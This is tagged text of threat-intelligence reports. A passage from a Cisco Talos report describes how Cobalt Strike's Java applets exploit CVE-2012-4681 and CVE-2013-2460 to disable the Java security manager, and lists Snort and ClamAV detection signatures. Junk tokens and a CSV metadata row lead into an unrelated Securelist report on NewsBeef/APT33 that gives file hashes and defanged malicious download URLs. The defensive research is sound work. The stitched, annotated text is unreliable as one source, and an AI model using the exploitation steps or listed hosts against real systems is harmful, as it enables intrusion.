SunToolkit Remote Code Execution

<SOFTWARE>Java</SOFTWARE> Version <= 1.7.0_6

This vulnerability exploits the <SOFTWARE>Java</SOFTWARE> 
`Class.forName()` or `ClassFinder` to 
gain access to private object fields. 
In the context of <MALWARE>CobaltStrike</MALWARE>, this 
resolves around calls to `SetField()` 
from `sun.awt.SunToolkit`. Originally 
in <SOFTWARE>Java 6</SOFTWARE>, this was not possible as we 
weren’t allowed to gain a reference 
to `sun.awt.SunToolkit`. In <SOFTWARE>Java 7.0_6</SOFTWARE>, 
this changed and introduced <CVE>CVE-2012-4681</CVE>.

There are three main methods to this class.

• `check()`

• `SetField()`

• `GetClass()`

Check() is the first function executed in the exploit and the execution path is 
pretty simple. As we saw in <CVE>CVE-2013-2465</CVE>, a Statement object is created for 
`setSecurityManager()`, along with a new permissions object.

The next operation is a call to `sf()`, short for `SetField()`, private class method 
with the statement class type, the desired field “acc”, our Statement object, 
and the new permissions we want. `Sun.awt.SunToolkit` is a restricted class 
for untrusted code, normally you wouldn’t be able to gain access in our current 
security context.



page 23 of 29© 2020 <ORG>Cisco</ORG>. All rights reserved. talos-external@cisco.com  |  talosintelligence.com

The art and science of detecting <MALWARE>Cobalt Strike</MALWARE>

An adversary could exploit this vulnerability by calling 
`Class.forName()` as the target method of the Expression. In 
reality, `forName()` is not called. Instead, `Expression` uses 
custom logic to load classes without verifying permissions. 
Without `Expression`, this would not be possible.

After returning to `SetField()` with our privileged class 
access, the second issue is exploited to gain access to 
a private field. An adversary could go on to disable the 
security manager and execute arbitrary shellcode.

<CVE>CVE-2013-2460</CVE> - <SOFTWARE>Oracle</SOFTWARE> <SOFTWARE>Java</SOFTWARE> ProviderSkeleton invoke() 
remote code execution

<SOFTWARE>Java</SOFTWARE> Version <= 1.7.0_21

This exploit involves gaining access to a restricted package 
through a public interface.

This exploit can be found in:

•  Bean

•  BeanHelper

•  BeanProvider

The `com.sun.tracing.Provider` and `java.lang.reflect.
InvocationHandler` are the main culprits here. This gives 
access to a `Provider` interface, or `ProviderSkeleton`, and 
provides the base for the target `invoke()` function.

This starts obtaining a lookup method by creating an 
Invocationhandler via ` java.lang.reflect.Proxy`. From there, 
the exploit can obtain a reference to `MethodHandles.
lookup` and call it via the InvocationHanlder defined earlier.

This is most of the work needed to begin exploitation, access 
to the `invoke()̀  method is already provided. But how does 
that give an attacker an opportunity to elevate privileges? The 
invoke method, in <SOFTWARE>Java 7u21</SOFTWARE>, does not perform any checks on 
whether or not a public method should be accessible by the 
calling class. See the openjdk commit in Figure 38.

The second issue is that in this case, `invoke()̀  does not 
return the calling blass but instead returns `sun.tracing.
ProviderSkeletoǹ . This all comes together because 
`ProviderSkeletoǹ  is a privileged class. Eventually, <MALWARE>Cobalt Strike</MALWARE> 
loads several classes and, once again, disables the manager.

<MALWARE>Cobalt Strike</MALWARE> now uses the `displayAd()` (Figure 39) to make 
calls to invoke() and return privileged classes that they 
would otherwise not have access to.

You can see another call to `getMethod()` prior to invoking 
the argument, this function is used to obtain access to the 
familiar `forName()` method. Then once again like earlier, that 
can be called to gain access to restricted classes (Figure 40).

Figure 38

Figure 39

Figure 40



page 24 of 29© 2020 <ORG>Cisco</ORG>. All rights reserved. talos-external@cisco.com  |  talosintelligence.com

The art and science of detecting <MALWARE>Cobalt Strike</MALWARE>

Next, three restricted classes are loaded:

• `sun.org.mozilla.javascript.internal.Context`

• `sun.org.mozilla.javascript.internal.DefiningClassLoader`

• `sun.org.mozilla.javascript.internal.GeneratedClassLoader`

This is now used to load the `BeanHelper()` class included 
with the Smart Applet and execute it under a privileged 
context by calling `AccessController.doPrivileged()’, as 
shown in Figure 41.

And the security manager is disabled... again.

Detection

The amount of devices running <SOFTWARE>Java</SOFTWARE> is astoundingly 
high still in 2020. It still continues to be a widely used 
language and commonly installed utility for users. These 
vulnerabilities are pretty old, but for the Smart Applet to be 
effective, the amount of vulnerable devices is likely still high 
enough to warrant them being included.

Now, detection here was the easiest part. Remember 
how the landing page was extremely similar to the Signed 
Applet module? Additionally, main.dll/main64.dll is again 
included in the Smart Applet JAR. We already covered it 
with the same detection. Case closed on some old <SOFTWARE>Java</SOFTWARE> 
vulnerabilities with prior coverage.

TARGET MODULE: SYSTEM PROFILER

This module is designed to perform reconnaissance on 
systems visiting a <MALWARE>Cobalt Strike</MALWARE>-controlled web server. It is 
important to note that this module is not intended to infect a 
host, but rather supply information on the operating system 
and applications installed on a target.

Payload

When an operator configures the system profiler, there are 
two options for gathering the desired information. The first 
one utilizes a large <SOFTWARE>JavaScript</SOFTWARE> file that leverages multiple 
<SOFTWARE>ActiveX</SOFTWARE> controls to gather information. The second is an 
optional <SOFTWARE>Java</SOFTWARE> Applet, a common theme we’ve seen in 
<MALWARE>Cobalt Strike</MALWARE>, to supply additional information on top of the 
JS. The final configuration option is a redirect. This makes 
the victim client redirect to another page after performing 
profiling the system.

The initial landing page for the system profiler delivers a 
page with code similar to Figure 42:

Let’s glance over both types for a high-level overview.

<SOFTWARE>Java</SOFTWARE> Applet

The initial landing page checks to see if <SOFTWARE>Java</SOFTWARE> is installed and 
enabled in two different ways. First, it uses `deployJava.
geJREs()` to return an array of installed versions, or an 
empty array if not present. The second is `navigator.

Figure 41

Figure 42



page 25 of 29© 2020 <ORG>Cisco</ORG>. All rights reserved. talos-external@cisco.com  |  talosintelligence.com

The art and science of detecting <MALWARE>Cobalt Strike</MALWARE>

javaEnabled()` which is a simple boolean ""True"" or ""False"".

<SOFTWARE>Java</SOFTWARE> is installed if either check succeeds. The <SOFTWARE>Java</SOFTWARE> Applet, 
“iecheck.class,” runs on the page, as shown in Figure 43.

The class contains a small code base that only has two 
functions. One is designed to return the version of <SOFTWARE>Java</SOFTWARE>, 
the client is running. The other is a little more tricky and is 
geared toward exposing the internal IP address of the client.

<SOFTWARE>JavaScript</SOFTWARE>

The <SOFTWARE>JavaScript</SOFTWARE> is the bulk of the profiler and a huge file 
weighing in at over 200KB and almost 5,000 lines of code 
(after beautifying it). It checks browser versions, system 
information and installed applications through <SOFTWARE>JavaScript</SOFTWARE> 
and <SOFTWARE>ActiveX</SOFTWARE> calls.

Some of the checks include but are not limited to web 
browser, operating system, Adobe Acrobat, Adobe Flash 
and more. It also includes another attempt to get the 
internal IP address of the client, just like the <SOFTWARE>Java</SOFTWARE> Applet.

Detection

Detection here is pretty straightforward. Since the profiler 
is trying to do so much at once, we can make quick work on 
the landing page by checking HTTP responses.

We want to look for any abnormal combination of 
application version checks by using <SOFTWARE>ActiveX</SOFTWARE> control class 
IDs and object names, static version checks, and attempts 
to load a Java applet. We can also look for attempts to 
store data within a 1x1 (width x height) element named 
`checkip`.

Figure 43

Figure 44



page 26 of 29© 2020 <ORG>Cisco</ORG>. All rights reserved. talos-external@cisco.com  |  talosintelligence.com

The art and science of detecting <MALWARE>Cobalt Strike</MALWARE>

Generally speaking, it’s the easiest way to catch 
communication in the response from the client. At the end 
of the “check.js” file, we see an attempt to make an HTTP 
POST request back to the server with whatever information 
was collected (Figure 44).

We can see that the client data section of the HTTP 
post contains the parameters and values sent to the 
`application()` function.

This left us with the following detection:

<SOFTWARE>Snort</SOFTWARE>

• 1:13913 BROWSER-PLUGINS AcroPDF.PDF <SOFTWARE>ActiveX</SOFTWARE> 
clsid access attempt

• 1:23878 BROWSER-PLUGINS <SOFTWARE>Oracle</SOFTWARE> <SOFTWARE>JRE</SOFTWARE> Deployment 
Toolkit <SOFTWARE>ActiveX</SOFTWARE> clsid access attempt

• 1:38038 POLICY-OTHER PDF <SOFTWARE>ActiveX</SOFTWARE> CLSID access 
detected

• 1:54180 MALWARE-OTHER <MALWARE>Cobalt Strike</MALWARE> system profil-
ing attempt

• 1:54181 MALWARE-OTHER <MALWARE>Cobalt Strike</MALWARE> system profil-
ing attempt

• 1:54182 MALWARE-OTHER <MALWARE>Cobalt Strike</MALWARE> system profil-
ing attempt

<SOFTWARE>ClamAV</SOFTWARE>

• <MALWARE>Java.Malware.CobaltStrike-8008971-0</MALWARE>

CONCLUSION
This is an in-depth view into the <MALWARE>Cobalt Strike</MALWARE> attack 
framework, how Talos researchers analyzed each module 
and the struggles, breakdowns, victories, and detection that 
came along with it.

The research performed resulted in more than 50 
signatures between <SOFTWARE>Snort</SOFTWARE> and <SOFTWARE>ClamAV</SOFTWARE> combined, covering 
over 400 <MALWARE>Cobalt Strike</MALWARE> samples.

It’s important to note that the resulting detection based on 
this research project is intended to provide robust coverage 
for <MALWARE>Cobalt Strike</MALWARE> at its core, but is by no means exhaustive. 
Large-scale attack frameworks are always evolving, 
especially highly funded ones such as <MALWARE>Cobalt Strike</MALWARE>.

Researchers must target what each security product does 
well and use that to their advantage. With that, you also 
have to know where its weaknesses lie. Having a good 



page 27 of 29© 2020 <ORG>Cisco</ORG>. All rights reserved. talos-external@cisco.com  |  talosintelligence.com

The art and science of detecting <MALWARE>Cobalt Strike</MALWARE>

understanding of the strengths and weaknesses in <SOFTWARE>Snort</SOFTWARE> or 
<SOFTWARE>ClamAV</SOFTWARE> is key to developing good generic detection.

Does this mean we have covered <MALWARE>Cobalt Strike</MALWARE> in its entirety 
and it’s forever dead in the eyes of Talos? No. Does it mean 
we have provided what we believe to be a reasonably high 
level of detection to stop <MALWARE>Cobalt Strike</MALWARE> in its current form? 
Most definitely.



page 28 of 29© 2020 Cisco. All rights reserved. talos-external@<ORG>Cisco</ORG>.com  |  talosintelligence.com

The art and science of detecting <MALWARE>Cobalt Strike</MALWARE>

APPENDIX A: COVERAGE

STAGED/STAGELESS EXECUTABLES

<SOFTWARE>Snort</SOFTWARE>

• 1:53656 MALWARE-OTHER <MALWARE>Cobalt Strike</MALWARE> x86 
executable download attempt

• 1:53657 MALWARE-OTHER <MALWARE>Cobalt Strike</MALWARE> x86 
executable download attempt

• 1:53658 MALWARE-OTHER <MALWARE>Cobalt Strike</MALWARE> x64 
executable download attempt

• 1:53659 MALWARE-OTHER <MALWARE>Cobalt Strike</MALWARE> x64 
executable download attempt

<SOFTWARE>ClamAV</SOFTWARE>

• `<MALWARE>Win.Trojan.CobaltStrike-7899871-1</MALWARE>

• `<MALWARE>Win.Trojan.CobaltStrike-7899872-1</MALWARE>

SCRIPTED WEB DELIVERY <SOFTWARE>PowerShell</SOFTWARE>

<SOFTWARE>Snort</SOFTWARE>

• 1:45907 MALWARE-CNC <MALWARE>Cobalt Strike</MALWARE> DNS beacon 
outbound TXT record **(UPDATED)**

• 1:45908 MALWARE-CNC <MALWARE>Cobalt Strike</MALWARE> DNS beacon 
inbound TXT record **(UPDATED)**

• 1:53972 MALWARE-OTHER <MALWARE>CobaltStrike</MALWARE> <IOC>beacon.dll</IOC> 
DNS download attempt

• 1:53973 MALWARE-OTHER <MALWARE>CobaltStrike</MALWARE> <SOFTWARE>powerShell</SOFTWARE> 
web delivery attempt

• 1:53974 MALWARE-OTHER <MALWARE>CobaltStrike</MALWARE> <SOFTWARE>powerShell</SOFTWARE> 
web delivery attempt

• 1:53975 INDICATOR-COMPROMISE <MALWARE>CobaltStrike</MALWARE> 
multiple large DNS TXT query responses

<SOFTWARE>ClamAV</SOFTWARE>

• `<MALWARE>Win.Trojan.Meterpreter-7385375-0</MALWARE>`

BEACON BINARY PAYLOADS

<SOFTWARE>Snort</SOFTWARE>

• 1:30229 INDICATOR-SHELLCODE <TOOL>Metasploit</TOOL> windows/
shell stage transfer attempt **(UPDATED)**

• 1:30471 INDICATOR-SHELLCODE <TOOL>Metasploit</TOOL> payload 
windows_adduser **(UPDATED)**

• 1:30480 INDICATOR-SHELLCODE INDICATOR-
SHELLCODE <TOOL>Metasploit</TOOL> payload windows_x64_
meterpreter_reverse_https **(UPDATED)**

• 1:53757 MALWARE-OTHER <MALWARE>CobaltStrike</MALWARE> <IOC>beacon.dll</IOC> 
download attempt

• 1:53758 MALWARE-OTHER <MALWARE>CobaltStrike</MALWARE> <IOC>beacon.dll</IOC> 
download attempt

<SOFTWARE>ClamAV</SOFTWARE>

• <MALWARE>Win.Trojan.MSShellcode-5</MALWARE>

• <MALWARE>Win.Trojan.CobaltStrike-7913051-0</MALWARE>

BEACON <SOFTWARE>POWERSHELL</SOFTWARE> PAYLOADS

<SOFTWARE>Snort</SOFTWARE>

• 1:54095 MALWARE-OTHER <MALWARE>Win.Trojan.CobaltStrike</MALWARE> 
<SOFTWARE>powershell</SOFTWARE> beacon download attempt

• 1:54096 MALWARE-OTHER <MALWARE>Win.Trojan.CobaltStrike</MALWARE> 
<SOFTWARE>powershell</SOFTWARE> beacon download attempt

<SOFTWARE>ClamAV</SOFTWARE>

• <MALWARE>Win.Trojan.CobaltStrike-7917400-0</MALWARE>

HTML APPLICATION (HTA) ATTACKS

<SOFTWARE>Snort</SOFTWARE>

• 1:8068 BROWSER-PLUGINS Microsoft Windows 
Scripting Host Shell <SOFTWARE>ActiveX</SOFTWARE> function call access

• 1:54110 MALWARE-OTHER <MALWARE>Html.Trojan.CobaltStrike</MALWARE> 
HTML payload download attempt

• 1:54111 MALWARE-OTHER <MALWARE>Html.Trojan.CobaltStrike</MALWARE> 



page 29 of 29© 2020 <ORG>Cisco</ORG>. All rights reserved. talos-external@cisco.com  |  talosintelligence.com

The art and science of detecting <MALWARE>Cobalt Strike</MALWARE>

HTML payload download attempt

• 1:54112 MALWARE-OTHER <MALWARE>Html.Trojan.CobaltStrike</MALWARE> 
HTML payload download attempt

• 1:54113 MALWARE-OTHER <MALWARE>Html.Trojan.CobaltStrike</MALWARE> 
HTML payload download attempt

• 1:54114 MALWARE-OTHER <MALWARE>Html.Trojan.CobaltStrike</MALWARE> 
<SOFTWARE>powershell</SOFTWARE> payload download attempt

• 1:54115 MALWARE-OTHER <MALWARE>Html.Trojan.CobaltStrike</MALWARE> 
<SOFTWARE>powershell</SOFTWARE> payload download attempt

• 1:54116 MALWARE-OTHER <MALWARE>Html.Trojan.CobaltStrike</MALWARE> 
<SOFTWARE>VBA</SOFTWARE> payload download attempt

• 1:54117 MALWARE-OTHER <MALWARE>Html.Trojan.CobaltStrike</MALWARE> 
<SOFTWARE>VBA</SOFTWARE> payload download attempt

<SOFTWARE>ClamAV</SOFTWARE>

• <MALWARE>Html.Trojan.CobaltStrike</MALWARE>-7932561-0

• <MALWARE>Html.Trojan.CobaltStrike</MALWARE>-7932562-0

• <MALWARE>Html.Trojan.CobaltStrike</MALWARE>-7932563-0

• <MALWARE>Html.Trojan.CobaltStrike</MALWARE>-7932564-0

<MALWARE>Cobalt Strike</MALWARE> SIGNED APPLET ATTACK

<SOFTWARE>Snort</SOFTWARE>

• 1:54169 MALWARE-OTHER <MALWARE>Cobalt Strike</MALWARE> signed java 
applet execution attempt

• 1:54170 MALWARE-OTHER <MALWARE>Cobalt Strike</MALWARE> signed java 
applet execution attempt

• 1:54171 MALWARE-OTHER <MALWARE>Cobalt Strike</MALWARE> signed java 
applet download attempt

• 1:54172 MALWARE-OTHER <MALWARE>Cobalt Strike</MALWARE> signed java 
applet download attempt

• 1:54173 MALWARE-OTHER <MALWARE>Cobalt Strike</MALWARE> signed java 
applet download attempt

• 1:54174 MALWARE-OTHER <MALWARE>Cobalt Strike</MALWARE> signed java 
applet download attempt

• 1:54175 INDICATOR-COMPROMISE <MALWARE>Cobalt Strike</MALWARE> 
default signed applet attack URI

<SOFTWARE>ClamAV</SOFTWARE>

• <MALWARE>Win.Trojan.CobaltStrike-8001474-0</MALWARE>

• <MALWARE>Win.Trojan.CobaltStrike-8001477-1</MALWARE>

<MALWARE>Cobalt Strike</MALWARE> SMART APPLET ATTACK

<SOFTWARE>Snort</SOFTWARE>

• 1:54183 INDICATOR-COMPROMISE <MALWARE>Cobalt Strike</MALWARE> 
default smart applet attack URI

<SOFTWARE>ClamAV</SOFTWARE>

• Prior coverage signed applet submissions

<MALWARE>Cobalt Strike</MALWARE> SYSTEM PROFILER ATTACK

<SOFTWARE>Snort</SOFTWARE>

• 1:13913 BROWSER-PLUGINS AcroPDF.PDF <SOFTWARE>ActiveX</SOFTWARE> 
clsid access attempt **MAX DETECT**

• 1:23878 BROWSER-PLUGINS <SOFTWARE>Oracle</SOFTWARE> <SOFTWARE>JRE</SOFTWARE> Deployment 
Toolkit <SOFTWARE>ActiveX</SOFTWARE> clsid access attempt **MAX DETECT**

• 1:38038 POLICY-OTHER PDF <SOFTWARE>ActiveX</SOFTWARE> CLSID access 
detected **MAX DETECT**

• 1:54180 MALWARE-OTHER <MALWARE>Cobalt Strike</MALWARE> system 
profiling attempt

• 1:54181 MALWARE-OTHER <MALWARE>Cobalt Strike</MALWARE> system 
profiling attempt

• 1:54182 MALWARE-OTHER <MALWARE>Cobalt Strike</MALWARE> system 
profiling attempt

<SOFTWARE>ClamAV</SOFTWARE>

• <MALWARE>Java.Malware.CobaltStrike-8008971-0</MALWARE>


	_fc5rziddqgfm
	_go2hv7ut784o
	_qf4jzftqnybl
	_1qukxsq0ft7l
	_j01c68rrkg1u
	_od77ioq0wcos
	_99ipmbl5celg
	_hfs1usdxyh4q
	_cd17e2cwur1j
	_wbmtaibalv70
	_ren4cj59lkps
	_z3idehsuoshh
	_u199v83bpgtu
	_9537z5lypnzt
	_dk6mdna6g3am
	_9onk0sobghz5
	_40yzzo1drv0j
	_71pcrxn6pqo0
	_lmdby71vme0l
	_dr9wgt4h9yv
	_1qc071i18p5g
	_bt0uo0xsnyxv
	_9jsukqkbp8ct
	_5xrbjztz2tfl
	_q86ltopafa1r
	_jl3vd2ktm2sb
	_f4q8adum2g4k
	_au0nhiun7ui8
	_gtdk8sa8pm4a
	_mb1iulmw5jzo
	_pdomcyx7hsnz
	_tvg24jel73pr
	_hc4d7tbfgmqo
	_u3q6qgudx3a
	_xnduwtwc8hoo
	_sjtpuuzd1m6t
	_gujeu0mh0ejn
	_fh0lzq5v1djb
	_idtxk3bsd6v1
	_ytkhdgc0lizh
	_8d2fhov2yn72
	_cuj3lrz5r3dh
	_dpq8rwkq5xnr
	_lv2ush8ssa9j
	_kgzwzc5u78ie
	_euerz6s41u3v
	_cjbnbda00hp1
	_hqoedzuzj41a",,Java;PowerShell;Snort;ClamAV;ActiveX;VBA;powershell;Oracle;JavaScript;Windows API;JNI;JDK 8;JRE;powerShell;SNORT;Cobalt Strike;Bitsadmin;Python;Java Native Interface;Java Virtual Machine;JVM;C/C++;JDK 8u5;Rhino;Java 7;Java 6;Java 7.0_6;Java 7u21;POWERSHELL,,Cisco,"September 11, 2020",Cobalt Strike;Html.Trojan.CobaltStrike;beacon;CobaltStrike;beacons;Beacon;Java.Malware.CobaltStrike-8008971-0;Win.Trojan.CobaltStrike;Cobalt;Beacons;Cobalt Beacon;Win.Trojan.CobaltStrike-7899871-1;Win.Trojan.CobaltStrike-7899872-1;Win.Trojan.Meterpreter-7385375-0;Win.Trojan.MSShellcode-5;Win.Trojan.CobaltStrike-7913051-0;Win.Trojan.CobaltStrike-7917400-0;Win.Trojan.CobaltStrike-8001474-0;Win.Trojan.CobaltStrike-8001477-1,,beacon.dll;artifact.exe;\\\\.\\pipe\\MSSE-6722-server.;cross_platformi9.jar,NICK MAVIS;JOE MARSHALL;JON MUNSHAW,,Metasploit,Reflective DLL injection;Reflective DLL loading,,,JAVA APPLET ATTACK,,CVE-2013-2465;CVE-2012-4681;CVE-2011-3544;CVE 2013-2465;CVE-2013-2460,0,151,0,31,1,199,0,10,3,0,13,2,0,0,1,0,7
Twas the night before,"<TIMESTAMP>7/5/2019</TIMESTAMP> ‘Twas <TIMESTAMP>the night before</TIMESTAMP> | Securelist

https://securelist.com/twas-the-night-before/91599/ 1/13

By GReAT

‘Twas <TIMESTAMP>the night before</TIMESTAMP>
securelist.com/twas-the-night-before/91599

Recently, the <COUNTRY>United States</COUNTRY> Cyber Command (<ORG>USCYBERCOM</ORG> Malware Alert
@CNMF_VirusAlert) highlighted several <SOFTWARE>VirusTotal</SOFTWARE> uploads of theirs – and the
executable objects relating to <TIMESTAMP>2016 – 2017</TIMESTAMP> <THREAT_ACTOR>NewsBeef/APT33</THREAT_ACTOR> activity are interesting for a
variety of reasons. Before continuing, it’s important to restate yet again that we defend
customers, and research malware and intrusions, regardless of their source.
Accordingly, subscribers to our private <THREAT_ACTOR>APT</THREAT_ACTOR> intelligence reports receive unique and
extraordinary data on the significant activity and campaigns of over 100 <THREAT_ACTOR>APT</THREAT_ACTOR>s from all
over the world, including this <TIMESTAMP>2016-2017</TIMESTAMP> <THREAT_ACTOR>NewsBeef /APT33</THREAT_ACTOR> activity.

<ORG>USCYBERCOM</ORG>’s <SOFTWARE>VirusTotal</SOFTWARE> executable object uploads appeared in our <TIMESTAMP>January 2017</TIMESTAMP>
private report “<THREAT_ACTOR>NewsBeef</THREAT_ACTOR> Delivers Christmas Presence”, an examination of a change in
the tactics used in <TECHNIQUE>spear-phishing</TECHNIQUE> and <TECHNIQUE>watering hole attacks</TECHNIQUE> against Saudi Arabian
targets. Two files uploaded by <ORG>USCYBERCOM</ORG> are of particular interest. These were first
seen <TIMESTAMP>Dec 2016</TIMESTAMP> and <TIMESTAMP>Jan 2017</TIMESTAMP>:

MD5: <IOC>d87663ce6a9fc0e8bc8180937b3566b9</IOC>, served as
<IOC>jquerycode-download[.]live/flashplayer23pp_xa_install.exe</IOC>
<IOC>jquerycode-download[.]live/chrome_update.exe</IOC>
Detected as BSS:<MALWARE>Exploit.Win32.Generic</MALWARE>, <MALWARE>Trojan-Downloader.Win32.Powdr.a</MALWARE>, <MALWARE>Trojan-Downloader.MSIL.Steamilik.zzo</MALWARE>

MD5: <IOC>9b1a06590b091d300781d8fbee180e75</IOC>, served as
<IOC>jquerycode-download[.]live/citrixreceiver.exe</IOC>
<IOC>jquerycode-download[.]live/citrixcertificate.exe</IOC>
<IOC>ntg-sa[.]com/downloads/citrix_certificate.exe</IOC>
Detected as BSS:<MALWARE>Exploit.Win32.Generic</MALWARE>, <MALWARE>Trojan-Downloader.PowerShell.Agent.ah</MALWARE>,
<MALWARE>DangerousObject.Multi.Generic</MALWARE>

In order to share insight into Cyber Command’s highlighted malware and its context,
some of our private report’s content will be re-written here. The <TIMESTAMP>January 2017</TIMESTAMP> report
followed up on other private reports published on the group’s <TECHNIQUE>BeEF</TECHNIQUE>-related activity in
<TIMESTAMP>2015</TIMESTAMP> and <TIMESTAMP>2016</TIMESTAMP>. All of them cover a thread of <TIMESTAMP>mid-2015</TIMESTAMP> activity continuing into <TIMESTAMP>2016</TIMESTAMP>, then
resetting and advancing in <TIMESTAMP>2016</TIMESTAMP> and into <TIMESTAMP>2017</TIMESTAMP>. Bear in mind that regardless of current
leaks, which do not always present exhaustive information on group participants, activity
from the region has had multiple overlaps and presents a confusion of internal
dynamics…

<THREAT_ACTOR>NewsBeef</THREAT_ACTOR> Delivers Christmas Presence
Examination of a change in tactics used in <TECHNIQUE>spearphishing</TECHNIQUE> and <TECHNIQUE>watering hole attacks</TECHNIQUE>
against Saudi Arabian targets

https://securelist.com/twas-the-night-before/91599/
https://twitter.com/CNMF_VirusAlert
https://www.virustotal.com/gui/file/28ebfe86217ed36ead5b429cadcd005338a0ae6207119729b53698b5e4a3ef3f/detection
https://www.kaspersky.com/enterprise-security/apt-intelligence-reporting
https://securelist.com/freezer-paper-around-free-meat/74503/


<TIMESTAMP>7/5/2019</TIMESTAMP> ‘Twas <TIMESTAMP>the night before</TIMESTAMP> | Securelist

https://securelist.com/twas-the-night-before/91599/ 2/13

Executive summary

The <THREAT_ACTOR>NewsBeef APT</THREAT_ACTOR> previously engaged in long-term, elaborate social engineering
schemes that take advantage of popular social network platforms. Previous analysis of
the <THREAT_ACTOR>NewsBeef APT</THREAT_ACTOR> indicates that the group focuses on Saudi Arabian (<COUNTRY>SA</COUNTRY>) and Western
targets, and lacks advanced offensive technology development capabilities.

In previous campaigns, <THREAT_ACTOR>NewsBeef</THREAT_ACTOR> relied heavily on its namesake technology, the
<TECHNIQUE>Browser Exploitation Framework</TECHNIQUE> (<TECHNIQUE>BeEF</TECHNIQUE>). However, in the <TIMESTAMP>summer of 2016</TIMESTAMP>, the group
deployed a new toolset that includes macro-enabled <SOFTWARE>Office</SOFTWARE> documents, <MALWARE>PowerSploit</MALWARE>, and
the <MALWARE>Pupy</MALWARE> backdoor. The most recent <THREAT_ACTOR>NewsBeef</THREAT_ACTOR> campaign uses this toolset in
conjunction with <TECHNIQUE>spearphishing emails</TECHNIQUE>, <TECHNIQUE>links sent over social media/standalone private
messaging applications</TECHNIQUE>, and <TECHNIQUE>watering hole attacks</TECHNIQUE> that leverage compromised high-
profile websites (some belonging to the <ORG>SA government</ORG>). The group changed multiple
characteristics year over year – tactics, the malicious <SOFTWARE>JavaScript</SOFTWARE> injection strategically
placed on compromised websites, and command and control C2 infrastructure. 

In a nutshell:

The <THREAT_ACTOR>NewsBeef</THREAT_ACTOR> actor deployed a new toolset in a campaign that focused primarily
on Saudi Arabian targets;
<TECHNIQUE>BeEF</TECHNIQUE> does not appear to be deployed as a part of the current campaign;
Compromised government and infrastructure-related websites are injected with
<SOFTWARE>JavaScript</SOFTWARE> that geolocates and redirects visitors to spoofed, attacker-controlled
web-servers;
Improvements in <SOFTWARE>JavaScript</SOFTWARE> injection and obfuscation may extend server
persistence;
<THREAT_ACTOR>NewsBeef</THREAT_ACTOR> continues to deploy malicious macro-enabled <SOFTWARE>Office</SOFTWARE> documents,
poisoned legitimate <SOFTWARE>Flash</SOFTWARE> and <SOFTWARE>Chrome</SOFTWARE> installers, <MALWARE>PowerSploit</MALWARE>, and <MALWARE>Pupy</MALWARE> tools

Technical Analysis

The <THREAT_ACTOR>NewsBeef</THREAT_ACTOR> campaign is divided into two main attack vectors, <TECHNIQUE>spearphishing</TECHNIQUE> and
strategic web compromise (<TECHNIQUE>watering hole</TECHNIQUE>) attacks. The group’s spearphishing
component uses malicious, macroenabled, <SOFTWARE>Microsoft Office</SOFTWARE> documents that deliver
PowerShell scripts. The scripts download poisoned installers (e.g. <SOFTWARE>Flash</SOFTWARE>, <SOFTWARE>Citrix Client</SOFTWARE>,
and <SOFTWARE>Chrome</SOFTWARE>) from an online presence (in at least one case, the group spoofed a
legitimate, well-known IT services organization). Once the installer is downloaded to a
victim machine, it runs <MALWARE>PowerSploit</MALWARE> scripts that in turn download and execute a full-
featured <MALWARE>Pupy</MALWARE> backdoor.

On <TIMESTAMP>December 25, 2016</TIMESTAMP>, the <THREAT_ACTOR>NewsBeef APT</THREAT_ACTOR> stood up a server to host a new set of
<SOFTWARE>Microsoft Office</SOFTWARE> documents (maintaining malicious macros and PowerShell scripts) to
support its spear-phishing operations. The group sent these documents (or links to them)
to targets via email, and over social network and standalone messaging clients.

To compromise websites and servers, the group identified vulnerable sites and injected
obfuscated <SOFTWARE>JavaScript</SOFTWARE> that redirected visitors to <THREAT_ACTOR>NewsBeef</THREAT_ACTOR>-controlled hosts (which
tracked victims and served malicious content). These compromised servers include



<TIMESTAMP>7/5/2019</TIMESTAMP> ‘Twas <TIMESTAMP>the night before</TIMESTAMP> | Securelist

https://securelist.com/twas-the-night-before/91599/ 3/13

<ORG>Saudi Arabian government</ORG> servers and other high-value organizational identities
relevant to their targets.

Targets, social engineering, delivery chain

The majority of <THREAT_ACTOR>NewsBeef</THREAT_ACTOR> targets that our researchers have observed are located in <COUNTRY>SA</COUNTRY>.
Targeting profiles include:

Government financial and administrative organizations
Government health organizations
Engineering and technical organizations
One British labor related government organization (targeted multiple times)

The bulk of the targets were affected through strategic web compromises, especially via
compromised government servers. However, <SOFTWARE>Kaspersky Security Network</SOFTWARE> (<SOFTWARE>KSN</SOFTWARE>) records
also contain links that victims clicked from the <SOFTWARE>Outlook</SOFTWARE> web client “outlook.live.com” as
well as attachments arriving through the <SOFTWARE>Outlook</SOFTWARE> desktop application. This behavior falls
in line with previous <THREAT_ACTOR>NewsBeef</THREAT_ACTOR> operations, where the group used other standalone
messaging clients to send malicious links. Interestingly, <THREAT_ACTOR>NewsBeef</THREAT_ACTOR> set up its server using
the hosting provider “<ORG>Choopa, LLC, US</ORG>”, the same hosting provider that the group used
in attacks over the <TIMESTAMP>summer of 2016</TIMESTAMP>.

The domain “<IOC>ntg-sa[.]com</IOC>” appears to
be an attempt by the <THREAT_ACTOR>NewsBeef</THREAT_ACTOR> actor
to spoof the legitimate Saudi IT services organization, “<ORG>National Technology Group</ORG>” (<ORG>NTG</ORG>) at,
“<IOC>ntg.com[.]sa</IOC>”. The malicious
documents served at the spoofed
website are shown below:

https://securelist.com/twas-the-night-before/91599/ipdomain/


<TIMESTAMP>7/5/2019</TIMESTAMP> ‘Twas <TIMESTAMP>the night before</TIMESTAMP> | Securelist

https://securelist.com/twas-the-night-before/91599/ 4/13

<ORG>NTG</ORG> is a legitimate company that provides IT services and support to <ORG>SA government</ORG>
organizations and communications firms (as well as international financial groups and
retailers), making it a high-value identity. Spoofing the identity of an IT service provider is
a particularly important asset to threat actors that can abuse the inherent trust of IT
organizations to push software (which may appear suspicious if served from another
source). <ORG>NTG</ORG>’s IT focus and client list likely aided <THREAT_ACTOR>NewsBeef</THREAT_ACTOR>’s delivery of malicious
PowerShell-enabled Office documents and poisoned installers.

https://securelist.com/twas-the-night-before/91599/ntgsa/


<TIMESTAMP>7/5/2019</TIMESTAMP> ‘Twas <TIMESTAMP>the night before</TIMESTAMP> | Securelist

https://securelist.com/twas-the-night-before/91599/ 5/13

In <TIMESTAMP>December 2016</TIMESTAMP>, the following active URLs were served from the spoofed <ORG>NTG</ORG>
identity. All of the poisoned installers are technologies that an IT support service may be
expected to deliver.

<IOC>hxxps://ntg-sa[.]com/Downloads/flashplayer23pp_xa_install.exe</IOC>
<IOC>hxxps://ntg-sa[.]com/Downloads/Citrix_Certificate.exe</IOC>
